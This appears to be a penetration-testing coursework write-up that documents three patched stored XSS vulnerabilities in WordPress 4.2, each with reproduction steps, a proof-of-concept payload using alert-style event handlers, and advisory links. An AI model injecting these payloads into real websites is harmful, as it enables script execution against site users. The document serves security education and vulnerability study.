# Pentesting-Unit-7

Exploit 1

Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

Summary:
Vulnerability types: XSS (CVE-2017-6817)
Tested in version: 4.2 (affects versions 4.0 - 4.7.2)
Fixed in version: 4.2.13

Steps to recreate:

Sign in as an administrator
Create a new Post
Switch from Visual editing mode to Text (HTML) editing mode
Insert the malicious YouTube embed shortcode
[embed src='https://www.youtube.com/embed/dQw4w9WgXcQ\x3csvg onload=alert("exploit!")\x3e'][/embed]

References:
    https://wpvulndb.com/vulnerabilities/8768
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
    https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
    https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html

Exploit 2

Authenticated Stored Cross-Site Scripting (XSS)

Summary:
Vulnerability types: XSS (CVE-2015-5622 and CVE-2015-5623)
Tested in version: 4.2 (affects versions 4.0 - 4.2.2
Fixed in version: 4.2.3

Steps to recreate:
Sign in as an administrator
Create a new Post
Switch from Visual editing mode to Text (HTML) editing mode
Insert the malicious a href code
<a href="[caption code=">]</a><a title=" onmouseover=alert('exploit!') ">link</a>

References:
        https://wpvulndb.com/vulnerabilities/8111
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
        https://wordpress.org/news/2015/07/wordpress-4-2-3/
        https://twitter.com/klikkioy/status/624264122570526720
        https://klikki.fi/adv/wordpress3.html
       
Exploit 3

(Required) Vulnerability Name or ID

Summary:
Vulnerability types: XSS (CVE-2015-5714)
Tested in version: 4.2 (affects versions 4.0 - 4.3        
Fixed in version: 4.2.5

Steps to recreate:
 
Sign in as an administrator
Create a new Post
Switch from Visual editing mode to Text (HTML) editing mode
Insert the malicious caption code
[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("exploit!")' ">Click!</a>

References:

    https://wpvulndb.com/vulnerabilities/8186
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
    https://wordpress.org/news/2015/09/wordpress-4-3-1/
    http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/













